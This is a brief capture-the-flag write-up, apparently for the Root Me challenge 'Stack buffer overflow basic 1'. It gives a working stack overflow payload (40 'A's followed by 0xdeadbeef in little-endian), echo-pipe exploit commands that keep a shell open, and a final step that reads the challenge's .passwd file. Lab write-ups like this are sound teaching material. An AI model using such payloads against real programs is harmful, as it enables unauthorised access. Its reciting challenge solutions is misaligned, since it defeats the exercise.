# Root Me System Challenges
## ELF x86 - Stack buffer overflow basic 1
```c
int check = 0x04030201;
char buf[40];
```
Buffer owerflow attack.

The payload is 
```
40 * A : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
We want check to be 0xdeadbeef, so :
0xdeadbeef => efbeadde (little endian)

Exploit is : 
```
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"
```

Command to execute : 
```
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | . ch13
```
The shell closes instantly, so we need to do : 
```
(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat) | ./ch13
```

We can then do : cat .passwd
to get the key.
